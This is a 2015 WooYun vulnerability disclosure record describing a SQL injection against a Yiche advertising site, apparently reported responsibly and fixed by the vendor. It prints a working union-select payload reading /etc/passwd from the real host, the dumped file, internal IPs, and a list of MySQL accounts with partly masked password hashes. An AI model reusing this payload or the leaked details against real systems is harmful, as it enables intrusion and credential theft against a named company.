{"id": 45609, "wybug_id": "wooyun-2015-095094", "wybug_title": "易车某站root注入,涉及核心50多个数据库（可内网漫游）", "wybug_corp": "易车", "wybug_author": "白开水", "wybug_date": "2015-02-01 21:08", "wybug_open_date": "2015-03-18 21:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "数据库账户权限过高", "管理后台对外", "后台被猜解", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-18：\t细节向公众公开  简要描述： 易车某站root注入,涉及核心50多个数据库，另外发现其实还有各种弱口令...也是醉了 详细说明：  通过前期搜集,获取到http://rtb.bitsmart.com.cn/  这个域名,直接提交单引号 发现注入  直接万能密码进入后台，后台找个舒服的注入点  搞到密码  发现是admin。。。顺道在读下passwd。http://rtb.bitsmart.com.cn/account.php?method=editAccount&id=81%20and%202=3%20union%20select%201,2,load_file%28%27/etc/passwd%27%29,4,5,6,7,8,9,0,11,12,13,14,15,16,17,18,19,20root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin nscd:x:28:28:NSCD Daemon:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin pcap:x:77:77::/var/arpwatch:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin avahi:x:70:70:Avahi daemon:/:/sbin/nologin rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin avahi-autoipd:x:100:156:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin mysql:x:500:500::/home/mysql:/sbin/nologin zabbix:x:501:501::/home/zabbix:/sbin/nologin www:x:502:502::/home/www:/bin/bash vsftpuser:x:503:502::/data/wwwroot:/sbin/nologin 剩下的就扔工具自己跑吧。这么多库写个shell很简单 ，不去走形式了  证明问题即可。Resp. Time(avg):\t286 msCurrent User: \tmlmuser@192.168.1.141Sql Version: \t5.5.25-logCurrent DB: \tbitsmartSystem User: \tmlmuser@192.168.1.141目测可轻松漫游了。Target: \t\thttp://rtb.bitsmart.com.cn/account.php?method=editAccount&id=2Host IP:\t\t211.151.77.132Web Server: \tApacheDB Server: \tMySQL >=5Resp. Time(avg):\t274 msCurrent User: \tmlmuser@192.168.1.141Sql Version: \t5.5.25-logCurrent DB: \tbitsmartSystem User: \tmlmuser@192.168.1.141Host Name: \tAD_DB01Installation dir: \t/usr/local/mysqlDB User & Pass: \troot:*8387AFaaaaaaaaaaaaaaa8CBE3D6C3F4DA8DCCD:localhostCompile OS: \tLinux\t\troot:*8387AFaaaaaaaAaaaaaaa8DCCD:AD_DB01\t\troot:*8387AaaaaaaaaaaaaaaaDA8DCCD:127.0.0.1\t\troot:*D4A2Aaaaaaaaaaaaaaaaaa252C6:%\t\t::localhost\t\t::AD_DB01\t\tmlmuser:*9F05F4xxxxxxxxxxxxxxxxxxxE43B5:%\t\tRepluser:*ECF07xxxxxxxxxxxxxxxxxxxEC202:%\t\tuser_cig_opv2:*D18xxxxxxxxxxxxxxxxxxxE63B8BD:%\t\tuser_easyad_syst:*4FD1171CxxxxxxxxxxxxxxxxxxxE5C:%\t\topv2:*9F0xxxxxxxxxxxxxxxxxxxE3B5:%\t\tweb_db:*9FFFxxxxxxxxxxxxxxxxxxxE4F049:192.168.1.141\t\troot:*8387AF57xxxxxxxxxxxxxxxxxxxECD:192.168.1.141\t\teasyad_system:*2DAxxxxxxxxxxxxxxxxxxxE6C2D3116A:%\t\tbitsmart:*65390AF02AFxxxxxxxxxxxxxxxxxxxE4F03183A:%\t\tcigdc_tagmanager:*05A157xxxxxxxxxxxxxxxxxxxEFB6445E49A:%\t\tcig_ad_sys_t:*1586C080xxxxxxxxxxxxxxxxxxxEC5FF:%\t\tyiche_ad_sys_t:*54xxxxxxxxxxxxxxxxxxxE1BA46F7:%\t\tyiche_ad_sys:*3CAxxxxxxxxxxxxxxxxxxxEAABB7E7:%\t\tauto_index_data:*01CxxxxxxxxxxxxxxxxxxxE9A5F8C:%\t\tcigdc_task:*AC9xxxxxxxxxxxxxxxxxxxE4281:%\t\tyiche_dad_reportxxxxxxxxxxxxxxxxxxxEE778F607F:%\t\tyiche_tag:*84B8xxxxxxxxxxxxxxxxxxxE0D202:%\t\tcigdc_yiche:*ExxxxxxxxxxxxxxxxxxxEA352D:%\t\tauto_index_web:*xxxxxxxxxxxxxxxxxxxEEC970:%\t\tauto_index_car:*A361AxxxxxxxxxxxxxxxxxxxEA70A0AF5B:%\t\tcigdc_yiche_api:*43CxxxxxxxxxxxxxxxxxxxEF151E85E:%\t\tcig_crmv2:*3CCFxxxxxxxxxxxxxxxxxxxEF879:%\t\tcig_adsense:*746xxxxxxxxxxxxxxxxxxxE6A7E3C:%\t\tcig_adsense_repo:*DxxxxxxxxxxxxxxxxxxxE28:%\t\tcigdc_server:*7EBxxxxxxxxxxxxxxxxxxxEA01:%\t\tdad_report_web:*D58AxxxxxxxxxxxxxxxxxxxE7AE:%\t\tprivate_package:*24FD9xxxxxxxxxxxxxxxxxxxE9FA7A:%\t\taudience_package:*5xxxxxxxxxxxxxxxxxxxEB1D:%\t\tcigdc_logmanage:*EAxxxxxxxxxxxxxxxxxxxED95:%\t\tcig_adsense_car:*B4xxxxxxxxxxxxxxxxxxxE0FB:%\t\teasyad_xiaol:*F40xxxxxxxxxxxxxxxxxxxEFE60E:%\t\tdad_manager:*42xxxxxxxxxxxxxxxxxxxED2C:%\t\tdad_test:*C479DxxxxxxxxxxxxxxxxxxxE69:%Data Bases: \tinformation_schema\t\tbitauto_data_stat\t\tbitsmart\t\tcarsv2222\t\tcheyisou\t\tcig_achievement\t\tcig_ad_sys_t\t\tcig_adsense\t\tcig_adsense_report\t\tcig_audience_package\t\tcig_blog_department\t\tcig_blog_easyad\t\tcig_crm\t\tcig_crmv2\t\tcig_institution\t\tcig_jiesuan\t\tcig_luxgen\t\tcig_mrm\t\tcig_mst\t\tcig_op\t\tcig_opv2\t\tcig_survey\t\tcig_tracking_report\t\tcig_urlanalytic\t\tcigdc_attribute\t\tcigdc_buffer\t\tcigdc_dealer\t\tcigdc_logmanage\t\tcigdc_monitor\t\tcigdc_page\t\tcigdc_pool\t\tcigdc_private_package\t\tcigdc_report\t\tcigdc_server\t\tcigdc_system\t\tcigdc_tagmanager\t\tcigdc_tagmanager_report\t\tcigdc_tagmanager_url\t\tcigdc_tagmanager_url_result\t\tcigdc_task\t\tcigdc_yiche\t\tcigdc_yiche_tuisong\t\tdiamond\t\tdiamond-production\t\teasyad_buffer\t\teasyad_mattar\t\teasyad_monitor\t\teasyad_report\t\teasyad_system\t\teasyad_task\t\tiBitAutotemp\t\tinnodb密码帮你们处理一下吧。   漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：  just do it   版权声明：转载请注明来源 白开水@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-02-01 21:10 厂商回复： 非常感谢对易车的帮助，我们会尽快处理 最新状态： 2015-02-05：漏洞已经修复，非常感谢对易车的支持  ", "replys": "漏洞评价：\n评论\n     2015-02-01 21:12 |    \t\t白开水 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:27        | 苍茫的天涯是我的爱~)\t\t \n  这么晚了还不下班啊  @易车    \n     2015-03-19 00:48 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  @白开水 安全无小事。你懂的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}